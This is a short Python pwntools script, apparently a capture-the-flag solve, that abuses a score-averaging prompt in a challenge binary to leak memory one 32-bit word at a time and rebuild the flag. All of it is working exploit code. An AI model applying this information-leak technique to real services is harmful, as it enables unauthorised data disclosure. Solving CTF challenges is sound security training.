#!/usr/bin/env python3

from pwn import *

def conn():
    context.update(arch='amd64', os='linux', terminal=['tmux', 'new-window'])
    if args.REMOTE:
        p = remote('0.cloud.chals.io', 10198)
    else:
        p = process('./chall')
        gdb.attach(p, '''
            b *(vuln+459)
            continue
        ''')
    return p

def get(k):
    p = conn()
    for _ in range(k):
        p.sendlineafter(b':', b'0')
    p.sendlineafter(b':', b'n')
    p.recvuntil(b'Average score is')
    average = float(p.recvuntil(b'\n')[:-2])
    p.sendlineafter(b'quit', b'q')
    return int(average*20)

last = 0
flag = b''
for i in range(20):
    curr = get(i)
    diff = last-curr
    diff = (diff + 2**32)%(2**32)
    bytes = pack(diff, word_size=32, sign=False)
    if i >= 5:
        flag += bytes
    last = curr

print(flag)
